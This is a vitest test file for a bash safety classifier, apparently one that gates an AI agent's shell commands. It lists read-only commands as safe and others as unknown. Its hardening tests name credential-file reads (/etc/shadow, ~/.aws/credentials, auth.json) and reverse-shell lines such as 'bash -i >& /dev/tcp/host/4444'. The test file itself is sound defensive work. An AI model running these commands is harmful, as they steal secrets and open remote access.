import { describe, it, expect } from "vitest";
import { classifyBashSafety, bashClassifierEnabled } from "./bash-classifier.js";

describe("bashClassifierEnabled", () => {
  it("is off by default, on only when armed", () => {
    expect(bashClassifierEnabled({})).toBe(false);
    expect(bashClassifierEnabled({ VANTA_BASH_CLASSIFIER: "0" })).toBe(false);
    expect(bashClassifierEnabled({ VANTA_BASH_CLASSIFIER: "1" })).toBe(true);
    expect(bashClassifierEnabled({ VANTA_BASH_CLASSIFIER: "on" })).toBe(true);
  });
});

describe("classifyBashSafety", () => {
  it("classifies clearly read-only commands as safe", () => {
    for (const c of ["ls -la", "pwd", "echo hi", "cat README.md", "head -n5 x", "wc -l f", "grep foo src", "rg pattern", "find . -name '*.ts'", "git status", "git diff HEAD", "git log --oneline -5", "git show abc123", "date", "which node"]) {
      expect(classifyBashSafety(c), c).toBe("safe");
    }
  });

  it("treats mutating/network/privileged commands as unknown (falls through)", () => {
    for (const c of ["rm -rf x", "sudo ls", "mv a b", "cp a b", "chmod 777 x", "curl http://x", "wget y", "dd if=/dev/zero of=x", "kill 1"]) {
      expect(classifyBashSafety(c), c).toBe("unknown");
    }
  });

  it("treats shell control / redirection / chaining / substitution as unknown", () => {
    for (const c of ["ls | sh", "cat x > y", "echo a >> b", "ls && rm x", "ls; rm x", "echo $(whoami)", "echo `id`", "cat <in"]) {
      expect(classifyBashSafety(c), c).toBe("unknown");
    }
  });

  it("treats git write subcommands + unknown heads as unknown", () => {
    for (const c of ["git push", "git commit -m x", "git reset --hard", "git checkout main", "git branch -D x", "git config user.name X", "npm install", "node script.js", "made-up-cmd"]) {
      expect(classifyBashSafety(c), c).toBe("unknown");
    }
  });

  it("treats find with executing/deleting actions as unknown", () => {
    expect(classifyBashSafety("find . -delete")).toBe("unknown");
    expect(classifyBashSafety("find . -exec rm {} +")).toBe("unknown");
  });
});

describe("classifyBashSafety — sensitive targets + reverse-shell vectors (hardening)", () => {
  it("never classifies a credential/system-path read as safe", () => {
    for (const c of ["cat /etc/shadow", "cat /etc/passwd", "find . -name id_rsa", "cat ~/.ssh/config", "grep key ~/.aws/credentials", "cat .env", "cat ~/.codex/auth.json", "find / -name google-tokens.json"]) {
      expect(classifyBashSafety(c), c).toBe("unknown");
    }
  });
  it("treats reverse-shell / persistence vectors as unknown", () => {
    for (const c of ["ncat host 4444", "socat - tcp:host:4444", "telnet host 23", "bash -i >& /dev/tcp/host/4444", "crontab payload"]) {
      expect(classifyBashSafety(c), c).toBe("unknown");
    }
  });
  it("still allows genuinely-safe in-project reads", () => {
    for (const c of ["cat README.md", "grep foo src/index.ts", "find src -name '*.ts'", "git status"]) {
      expect(classifyBashSafety(c), c).toBe("safe");
    }
  });
});
